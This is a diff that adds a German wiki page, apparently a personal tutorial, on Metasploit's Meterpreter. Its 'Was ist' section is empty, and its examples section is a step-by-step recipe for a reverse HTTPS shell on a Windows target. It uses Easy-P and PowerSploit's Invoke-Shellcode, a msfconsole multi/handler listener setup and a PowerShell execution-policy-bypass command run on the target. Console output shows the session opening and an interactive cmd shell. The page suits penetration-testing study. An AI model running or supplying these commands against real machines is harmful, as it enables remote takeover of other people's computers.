@@ -1,0 +1,105 @@
+
+<h1 class="sectionedit1" id="was_ist_der_meterpreter">Was ist der Meterpreter</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "Was ist der Meterpreter" [1-40] -->
+<h2 class="sectionedit2" id="beispiele">Beispiele</h2>
+<div class="level2">
+
+<p>
+Ein mögliches Beispiel mit PowerShell und Easy-P und der msfconsole. 
+</p>
+
+<p>
+Easy-P kann über git heruntergeladen werden. 
+</p>
+
+<p>
+<a href="https://github.com/cheetz/Easy-P" class="urlextern" title="https://github.com/cheetz/Easy-P" rel="nofollow">https://github.com/cheetz/Easy-P</a>
+</p>
+
+<p>
+Der Start erfolgt über Python 
+<pre class="code bash">python easy_p.py</pre>
+
+</p>
+
+<p>
+In meinen Fall möchte ich ein PowerShell Meterpreter erstellen. Press 4 
+</p>
+
+<p>
+Auf der folgenden Webseite kann der Orginal PowerShell Meterpreter gedownloadet werden <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1" class="urlextern" title="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1" rel="nofollow">https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1</a>
+</p>
+
+<p>
+Als nächstes wird die der LHOST als localhost angebenden und der LPORT 
+</p>
+
+<p>
+<pre class="code bash">LHOST: 192.168.50.105
+LPORT: <span class="nu0">4444</span></pre>
+
+</p>
+
+<p>
+ In der msfconsole muss folgendes eingegeben werden.
+</p>
+
+<p>
+<pre class="code bash">msfconsole <span class="re5">-r</span> listener.rc
+use multi<span class="sy0">/</span>handler 
+<span class="kw1">set</span> payload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_https 
+<span class="kw1">set</span> LHOST 192.168.50.105
+<span class="kw1">set</span> LPORT <span class="nu0">4444</span>
+<span class="kw1">set</span> ExitOnSession <span class="kw2">false</span> 
+exploit <span class="re5">-j</span></pre>
+
+</p>
+
+<p>
+Auf dem Zielclient muss folgendes Eingeben werden.
+</p>
+
+<p>
+<pre class="code powershell">powershell.exe <span class="sy0">-</span>exec bypass <span class="kw5">-Command</span> <span class="st0">&quot;&amp; {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.50.105 -Lport 4444 -Force}&quot;</span></pre>
+
+</p>
+
+<p>
+Danach kann man auf die session 1 zugreifen .
+</p>
+
+<p>
+<div class="konsole"><div class="konsole_top_left"></div><div class="konsole_top">USER</div><div class="konsole_top_right"></div><div class="konsole_left"></div><div class="konsoleuser">
+[*] Exploit running as background job.
+</p>
+
+<p>
+[*] Started HTTPS reverse handler on <a href="https://0.0.0.0:4444/" class="urlextern" title="https://0.0.0.0:4444/" rel="nofollow">https://0.0.0.0:4444/</a>
+msf exploit(handler) > [*] Starting the payload handler…
+[*] 192.168.50.102:53495 (UUID: 8ce59193af0afda2/x86=1/windows=1/2015-11-02T19:15:48Z) Staging Native payload …
+[*] Meterpreter session 1 opened (192.168.50.105:4444 → 192.168.50.102:53495) at 2015-11-02 20:15:49 +0100
+</div><div class="konsole_right"></div><div class="konsole_bottom_left"></div><div class="konsole_bottom"></div><div class="konsole_bottom_right"></div></div>
+</p>
+
+<p>
+Mit dem Kommando session kann man auf den Zielclient zugreifen.
+</p>
+
+<p>
+<div class="konsole"><div class="konsole_top_left"></div><div class="konsole_top">USER</div><div class="konsole_top_right"></div><div class="konsole_left"></div><div class="konsoleuser">
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1…
+meterpreter > shell
+Process 1120 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.10240]
+© 2015 Microsoft Corporation. Alle Rechte vorbehalten.
+C:\temp>
+</div><div class="konsole_right"></div><div class="konsole_bottom_left"></div><div class="konsole_bottom"></div><div class="konsole_bottom_right"></div></div>
+</p>
+
+</div>
+<!-- EDIT2 SECTION "Beispiele" [41-] -->
